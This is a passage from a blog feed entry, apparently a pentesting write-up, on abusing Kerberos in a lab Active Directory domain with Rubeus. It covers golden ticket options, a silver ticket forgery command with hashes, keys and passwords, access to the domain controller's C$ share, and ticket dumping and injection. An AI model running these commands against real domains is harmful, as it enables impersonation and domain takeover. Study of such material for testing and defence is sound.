alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA&#x2F;s16000&#x2F;20.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>As you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal</p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA&#x2F;s16000&#x2F;21.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>Also, at the end you‚Äôll see a one liner command that can be used to generate this TGT again.</p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ&#x2F;s16000&#x2F;22.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>Various other options can be used in conjunction with golden to modify the generated TGT like:</p><ul><li><p>&#x2F;rangeinterval: After every time specified, a new ticket will be generated.</p></li><li><p>&#x2F;rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.</p></li></ul><p>For a full list of modifications, see¬†<a href="https://github.com/GhostPack/Rubeus#ticket-forgery">this</a>¬†page.</p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ&#x2F;s16000&#x2F;23.png?w&#x3D;640&amp;ssl&#x3D;1"></p><h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p>Silver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page¬†<strong><a href="https://adsecurity.org/?p=2011">here</a></strong>.</p><p>Silver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:</p><ul><li><p>&#x2F;service: SPN of the service ticket is being generated for</p></li><li><p>&#x2F;rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket</p></li><li><p>&#x2F;user: username of the user whose hash is provided</p></li><li><p>&#x2F;creduser: User to be impersonated</p></li><li><p>&#x2F;credpassword: Password of the user to be impersonated</p></li><li><p>&#x2F;krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.</p></li><li><p>&#x2F;krbenctype: type of encrypted hash used. Aes256 here.</p></li></ul><p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p><p><code>rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA&#x2F;s16000&#x2F;24.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>This helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine‚Äôs C drive</p><p><code>dir \\dc1.ignite.local\c$</code><br><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA&#x2F;s16000&#x2F;25.png?w&#x3D;640&amp;ssl&#x3D;1"></p><h3 id="Ticket-Management"><a href="#Ticket-Management" class="headerlink" title="Ticket Management"></a>Ticket Management</h3><p>Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.</p><p><strong>Ptt</strong></p><p>The Rubeus ptt option can import the supplied ticket in command line. The &#x2F;ptt can also be used in conjunction with other options that output tickets. For example,</p><p><code>rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA&#x2F;s16000&#x2F;26.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>As you can see, the generated ticket has now been imported.</p><p><strong>Purge</strong></p><p>Rubeus has a purge option which can purge&#x2F;delete all the tickets existing in the current session.</p><p>Here, we demonstrate how we purged 2 tickets listed by klist.</p><p><code>rubeus.exe purge</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg&#x2F;s16000&#x2F;27.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>Describe</strong></p><p>Often we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.</p><p>We can provide the ticket using &#x2F;ticket flag.</p><p><code>rubeus.exe describe /ticket:doIFNDCCBTCg...bA==</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A&#x2F;s16000&#x2F;28.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>Triage</strong></p><p>While klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user‚Äôs session memory but other user‚Äôs tickets in memory too.</p><ul><li>&#x2F;luid: This flag can be used to provide a specific user ID.</li></ul><p><code>rubeus.exe triage</code><br><code>rubeus.exe triage /luid:*0x8f57c*</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w&#x2F;s16000&#x2F;29.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>Also, when the LUID is known, we can purge particular user‚Äôs tickets too (elevated mode only)</p><p><code>rubeus.exe purge /luid:*0x8f57c*</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ&#x2F;s16000&#x2F;30.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>Dump</strong></p><p>If the session is running in an elevated mode, a user can dump&#x2F; extract all the current TGTs and service tickets. Again, &#x2F;luid can be provided to dump specific user‚Äôs tickets. &#x2F;service can be used to filter these tickets.</p><p>For example, &#x2F;service:krbtgt displays only TGTs.</p><p><code>rubeus.exe dump</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw&#x2F;s16000&#x2F;31.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>Next part I‚Äôll work on the mitigation bit as it‚Äôs own unit hope you learnt a few bit on the read ‚Ä¶ üòä   </p>]]></content>
    
    
    <summary type="html">Active Directory kerberos</summary>
    
    
    
    <category term="Writeups" scheme="https://malw0re.github.io/categories/Writeups/"/>
    
    
    <category term="Active-Directory" scheme="https://malw0re.github.io/tags/Active-Directory/"/>
    
  </entry>
  
</feed>
